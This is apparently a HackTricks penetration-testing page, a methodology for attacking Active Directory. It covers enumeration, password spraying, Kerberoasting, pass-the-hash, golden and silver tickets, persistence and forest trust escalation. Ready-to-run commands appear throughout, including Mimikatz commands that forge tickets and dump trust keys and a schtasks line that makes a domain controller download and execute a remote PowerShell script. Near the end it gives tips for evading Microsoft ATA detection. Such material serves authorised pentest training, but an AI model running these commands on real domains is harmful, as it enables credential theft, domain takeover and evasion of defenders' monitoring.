# Active Directory Methodology

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>

## Basic overview

Active Directory allows network administrators to create and manage domains, users, and objects within a network. For example, an admin can create a group of users and give them specific access privileges to certain directories on the server. As a network grows, Active Directory provides a way to organize a large number of users into logical groups and subgroups, while providing access control at each level.

The Active Directory structure includes three main tiers: 1) domains, 2) trees, and 3) forests. Several objects (users or devices) that all use the same database may be grouped in to a single domain. Multiple domains can be combined into a single group called a tree. Multiple trees may be grouped into a collection called a forest. Each one of these levels can be assigned specific access rights and communication privileges.

Main concepts of an Active Directory:

1. **Directory** – Contains all the information about the objects of the Active directory
2. **Object** – An object references almost anything inside the directory (a user, group, shared folder...)
3. **Domain** – The objects of the directory are contained inside the domain. Inside a "forest" more than one domain can exist and each of them will have their own objects collection.
4. **Tree** – Group of domains with the same root. Example: _dom.local, email.dom.local, www.dom.local_
5. **Forest** – The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships.

Active Directory provides several different services, which fall under the umbrella of "Active Directory Domain Services," or AD DS. These services include:

1. **Domain Services** – stores centralized data and manages communication between users and domains; includes login authentication and search functionality
2. **Certificate Services** – creates, distributes, and manages secure certificates
3. **Lightweight Directory Services** – supports directory-enabled applications using the open (LDAP) protocol
4. **Directory Federation Services** – provides single-sign-on (SSO) to authenticate a user in multiple web applications in a single session
5. **Rights Management** – protects copyrighted information by preventing unauthorized use and distribution of digital content
6. **DNS Service** – Used to resolve domain names.

AD DS is included with Windows Server (including Windows Server 10) and is designed to manage client systems. While systems running the regular version of Windows do not have the administrative features of AD DS, they do support Active Directory. This means any Windows computer can connect to a Windows workgroup, provided the user has the correct login credentials.\
**From:** [**https://techterms.com/definition/active\_directory**](https://techterms.com/definition/active\_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

## Recon Active Directory (No creds/sessions)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

* **Pentest the network:**
  * Scan the network, find machines and open ports and try to **exploit vulnerabilities** or **extract credentials** from them (for example, [printers could be very interesting targets](ad-information-in-printers.md).
  * Enumerating DNS could give information about key servers in the domain as web, printers, shares, vpn, media, etc.
    * `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  * Take a look to the General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) to find more information about how to do this.
* **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
  * `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  * `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  * `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  * [**A more detailed guide on how to enumerate a SMB server can be found here.**](../../network-services-pentesting/pentesting-smb.md)
* **Enumerate Ldap**
  * `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  * [**A more detailed guide on how to enumerate LDAP can be found here.**](../../network-services-pentesting/pentesting-ldap.md)
* **Poison the network**
  * Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  * Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)****
  * Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
* [**OSINT**](https://book.hacktricks.xyz/external-recon-methodology):
  * Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.
  * If you find the complete names of company workers, you could try different AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). The most common conventions are: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
  * Tools:
    * [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    * [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC\_ERR\_PREAUTH\_REQUIRED_, indicating that the user is required to perform pre-authentication.

```
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
msf> use auxiliary/gather/kerberos_enumusers
crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
```

{% hint style="warning" %}
You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names).

However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) **** to generate potential valid usernames.
{% endhint %}

#### **OWA (Outlook Web Access) Server**

If you found one of these servers in the network you can also perform **user enumeration against it**. For example, you could use the tool [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

* [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT\_REQ\_PREAUTH_ you can **request a AS\_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
* [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!) or could login with empty password: [Invoke-SprayEmptyPassword.ps1](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1).

## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

* You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
* You can also use [**powershell for recon**](../basic-powershell-for-pentesters/) which will be stealthier
* You ca also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
* Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
* A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
* You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
* If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
* You could also try automated tools as:
  * [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)****
  * ****[**61106960/adPEAS**](https://github.com/61106960/adPEAS)****
*   #### Extracting all domain users

    It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

The goal of Kerberoasting is to harvest **TGS tickets for services that run on behalf of domain user accounts**. Part of these TGS tickets are **encrypted wit keys derived from user passwords**. As a consequence, their credentials could be **cracked offline**.

**Find more information about this attack** [**in the Kerberoast page**](kerberoast.md)**.**

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTML Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTML [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/).\
Then, its time to dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](../stealing-credentials/)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**More information about this attack and about how does NTLM works here**](../ntlm/#pass-the-hash)**.**

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.\
[**More information about Over Pass the Hash/Pass the Key here.**](over-pass-the-hash-pass-the-key.md)

### Pass the Ticket

This attack is similar to Pass the Key, but instead of using hashes to request a ticket, the **ticket itself is stolen** and used to authenticate as its owner.\
[**More information about Pass the Ticket here**](pass-the-ticket.md)**.**

### MSSQL Abuse & Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA), **steal** the NetNTLM **hash** or even perform a **relay** **attack**.\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\
**The links between databases work even across forest trusts.**\
[**More information about this technique here.**](abusing-ad-mssql.md)

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).\
[**More information about this technique here.**](unconstrained-delegation.md)

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.\
[**More information about this attacks and some constrains here.**](constrained-delegation.md)

### ACLs Abuse

The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.\
[**More information about interesting privileges here.**](acl-persistence-abuse.md)

### Printer Spooler service abuse

If you can find any **Spool service listening** inside the domain, you may be able to **abuse** is to **obtain new credentials** and **escalate privileges**.\
[**More information about how to find a abuse Spooler services here.**](printers-spooler-service-abuse.md)

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Once you get **Domain Admin** or even better **Enterprise Admin** privileges, you can **dump** the **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](../stealing-credentials/)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

*   Make users vulnerable to [**Kerberoast**](kerberoast.md)

    ```powershell
    Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
    ```
*   Make users vulnerable to [**ASREPRoast** ](asreproast.md)

    ```powershell
    Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
    ```
*   Grant [**DCSync**](./#dcsync) privileges to a user

    ```powershell
    Add-DomainObjectAcl -TargetIdentity "DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights DCSync
    ```

### Silver Ticket

The Silver ticket attack is based on **crafting a valid TGS for a service once the NTLM hash of service is owned** (like the **PC account hash**). Thus, it is possible to **gain access to that service** by forging a custom TGS **as any user** (like privileged access to a computer).

{% content-ref url="silver-ticket.md" %}
[silver-ticket.md](silver-ticket.md)
{% endcontent-ref %}

### Golden Ticket

A valid **TGT as any user** can be created **using the NTLM hash of the krbtgt AD account**. The advantage of forging a TGT instead of TGS is being **able to access any service** (or machine) in the domain ad the impersonated user.

{% content-ref url="golden-ticket.md" %}
[golden-ticket.md](golden-ticket.md)
{% endcontent-ref %}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### **Forged Certificates**

{% content-ref url="forged-certificates.md" %}
[forged-certificates.md](forged-certificates.md)
{% endcontent-ref %}

### AdminSDHolder Group

The Access Control List (ACL) of the **AdminSDHolder** object is used as a template to **copy** **permissions** to **all “protected groups”** in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins, Backup Operators and krbtgt.\
By default, the ACL of this group is copied inside all the "protected groups". This is done to avoid intentional or accidental changes to these critical groups. However, if an attacker **modifies the ACL** of the group **AdminSDHolder** for example, giving full permissions to a regular user, this user will have full permissions on all the groups inside the protected group (in an hour).\
And if someone tries to delete this user from the Domain Admins (for example) in an hour or less, the user will be back in the group.\
****[**More information about AdminDSHolder Group here.**](privileged-accounts-and-token-privileges.md#adminsdholder-group)****

### DSRM Credentials

There is a **local administrator** account inside each **DC**. Having admin privileges in this machine, you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password** so you can remotely access to this local Administrator user.

{% content-ref url="dsrm-credentials.md" %}
[dsrm-credentials.md](dsrm-credentials.md)
{% endcontent-ref %}

### ACL Persistence

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.

{% content-ref url="acl-persistence-abuse.md" %}
[acl-persistence-abuse.md](acl-persistence-abuse.md)
{% endcontent-ref %}

### Security Descriptors

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.

{% content-ref url="security-descriptors.md" %}
[security-descriptors.md](security-descriptors.md)
{% endcontent-ref %}

### Skeleton Key

**Modify LSASS** in memory to create a **master password** that will work for any account in the domain.

{% content-ref url="skeleton-key.md" %}
[skeleton-key.md](skeleton-key.md)
{% endcontent-ref %}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.\


{% content-ref url="custom-ssp.md" %}
[custom-ssp.md](custom-ssp.md)
{% endcontent-ref %}

### DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.

{% content-ref url="dcshadow.md" %}
[dcshadow.md](dcshadow.md)
{% endcontent-ref %}

## Forest Privilege Escalation - Domain Trusts

Microsoft considers that the **domain isn't a Security Boundary**, the **Forest is the security Boundary**. This means that **if you compromise a domain inside a Forest you are going to be able to compromise the entire Forest**.

### Basic Information

At a high level, a [**domain trust**](http://technet.microsoft.com/en-us/library/cc759554\(v=ws.10\).aspx) establishes the ability for **users in one domain to authenticate** to resources or act as a [security principal](https://technet.microsoft.com/en-us/library/cc780957\(v=ws.10\).aspx) **in another domain**.

Essentially, all a trust does is **linking up the authentication systems of two domains** and allowing authentication traffic to flow between them through a system of referrals.\
When **2 domains trust each other they exchange keys**, these **keys** are going to be **saved** in the **DCs** of **each domains** (**2 keys per trust direction, latest and previous**) and the keys will be the base of the trust.

When a **user** tries to **access** a **service** on the **trusting domain** it will request an **inter-realm TGT** to the DC of its domain. The DC wills serve the client this **TGT** which would be **encrypted/signed** with the **inter-realm** **key** (the key both domains **exchanged**). Then, the **client** will **access** the **DC of the other domain** and will **request** a **TGS** for the service using the **inter-realm TGT**. The **DC** of the trusting domain will **check** the **key** used, if it's ok, it will **trust everything in that ticket** and will serve the TGS to the client.

![](<../../.gitbook/assets/image (166) (1).png>)

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.

**Different trusting relationships:**

* **Parent/Child** – part of the same forest – a child domain retains an implicit two-way transitive trust with its parent. This is probably the most common type of trust that you’ll encounter.
* **Cross-link** – aka a “shortcut trust” between child domains to improve referral times. Normally referrals in a complex forest have to filter up to the forest root and then back down to the target domain, so for a geographically spread out scenario, cross-links can make sense to cut down on authentication times.
* **External** – an implicitly non-transitive trust created between disparate domains. “[External trusts provide access to resources in a domain outside of the forest that is not already joined by a forest trust.](https://technet.microsoft.com/en-us/library/cc773178\(v=ws.10\).aspx)” External trusts enforce SID filtering, a security protection covered later in this post.
* **Tree-root** – an implicit two-way transitive trust between the forest root domain and the new tree root you’re adding. I haven’t encountered tree-root trusts too often, but from the [Microsoft documentation](https://technet.microsoft.com/en-us/library/cc773178\(v=ws.10\).aspx), they’re created when you when you create a new domain tree in a forest. These are intra-forest trusts, and they [preserve two-way transitivity](https://technet.microsoft.com/en-us/library/cc757352\(v=ws.10\).aspx) while allowing the tree to have a separate domain name (instead of child.parent.com).
* **Forest** – a transitive trust between one forest root domain and another forest root domain. Forest trusts also enforce SID filtering.
* **MIT** – a trust with a non-Windows [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domain. I hope to dive more into MIT trusts in the future.

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
   1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

There are three **main** ways that security principals (users/groups/computer) from one domain can have access into resources in another foreign/trusting domain:

* They can be added to **local groups** on individual machines, i.e. the local “Administrators” group on a server.
* They can be added to **groups in the foreign domain**. There are some caveats depending on trust type and group scope, described shortly.
* They can be added as principals in an **access control list**, most interesting for us as principals in **ACEs** in a **DACL**. For more background on ACLs/DACLs/ACEs, check out the “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an\_ace\_up\_the\_sleeve.pdf)” whitepaper.

### Child-to-Parent forest privilege escalation

#### SID-History Injection

Also, notice that there are **2 trusted keys**, one for _Child --> Parent_ and another one for P\_arent --> Child\_.

```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
/domain:<Current domain>
/sid:<SID of current domain>
/sids:<SID of the Enterprise Admins group of the parent domain>
/rc4:<Trusted key>
/user:Administrator
/service:<target service>
/target:<Other domain>
/ticket:C:\path\save\ticket.kirbi
```

For finding the **SID** of the **"Enterprise Admins"** group you can find the **SID** of the **root domain** and set it in S-1-5-21\_root domain\_-519. For example, from root domain SID _S-1-5-21-280534878-1496970234-700767426_ the "Enterprise Admins"group SID is _S-1-5-21-280534878-1496970234-700767426-519_

[http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local 
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
```

Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local
schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```

#### Exploit writeable Configration NC

The Configuration NC is the primary repository for configuration information for a forest and is replicated to every DC in the forest. Additionally, every writable DC (not read-only DCs) in the forest holds a writable copy of the Configuration NC. Exploiting this require running as SYSTEM on a (child) DC.

It is possible to compromise the root domain in various ways. Examples:

* [Link GPO to to root DC site](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)
* [Compromise gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)
* [Schema attack](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)
* Exploit ADCS - Create/modify certificate template to allow authentication as any user (e.g. Enterprise Admins)

### External Forest Domain Privilege escalation

In this case you can **sign with** the **trusted** key a **TGT impersonating** the **Administrator** user of the current domain. In this case you **won't always get Domain Admins privileges in the external domain**, but **only** the privileges the Administrator user of your current domain **was given** in the external domain.

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
```

### Attack one-way trusted domain/forest (Trust account attack)

In short, if an attacker has administrative access to FORESTB which trusts FORESTA, the attacker can obtain the credentials for a _trust account_ located in FORESTA. This account is a member of Domain Users in FORESTA through its Primary Group. As we see too often, Domain Users membership is all that is necessary to identify and use other techniques and attack paths to become Domain Admin.

![](https://images.squarespace-cdn.com/content/v1/5bbb4a7301232c6e6c8757fa/61a0233f-edd8-40b6-b6ae-8592a29875bd/Picture3.png)

This technique is not limited to forest trust but works over any domain/forest one-way trust in the direction trusting -> trusted.

The trust protections (SID filtering, disabled SID history, and disabled TGT delegation) do not mitigate the technique.

[Read more](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

### Domain trust abuse mitigation

**SID Filtering:**

* Avoid attacks which abuse SID history attribute across forest trust.
* Enabled by default on all inter-forest trusts. Intra-forest trusts are assumed secured by default (MS considers forest and not the domain to be a security boundary).
* But, since SID filtering has potential to break applications and user access, it is often disabled.
* Selective Authentication
  * In an inter-forest trust, if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given.
* Does not prevent writeable Configration NC exploitation and trust account attack.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)\
**Please, find some migrations against each technique in the description of the technique.**

* Not allow Domain Admins to login on any other hosts apart from Domain Controllers
* Never run a service with DA privileges
* If you need domain admin privileges, limit the time: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### Deception

* Password does not expire
* Trusted for Delegation
* Users with SPN
* Password in description
* Users who are members of high privilege groups
* Users with ACL rights over other users, groups or containers
* Computer objects
* ...
* [https://github.com/samratashok/Deploy-Deception](https://github.com/samratashok/Deploy-Deception)
  * `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`

## How to identify deception

**For user objects:**

* ObjectSID (different from the domain)
* lastLogon, lastlogontimestamp
* Logoncount (very low number is suspicious)
* whenCreated
* Badpwdcount (very low number is suspicious)

**General:**

* Some solutions fill with information in all the possible attributes. For example, compare the attributes of a computer object with the attribute of a 100% real computer object like DC. Or users against the RID 500 (default admin).
* Check if something is too good to be true
* [https://github.com/JavelinNetworks/HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)

### Bypassing Microsoft ATA detection

#### User enumeration

ATA only complains when you try to enumerate sessions in the DC, so if you don't look for sessions in the DC but in the rest of the hosts, you probably won't get detected.

#### Tickets impersonation creation (Over pass the hash, golden ticket...)

Always create the tickets using the **aes** keys also because what ATA identifies as malicious is the degradation to NTLM.

#### DCSync

If you don't execute this from a Domain Controller, ATA is going to catch you, sorry.

## More Tools

* [Powershell script to do domain auditing automation](https://github.com/phillips321/adaudit)
* [Python script to enumerate active directory](https://github.com/ropnop/windapsearch)
* [Python script to enumerate active directory](https://github.com/CroweCybersecurity/ad-ldap-enum)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

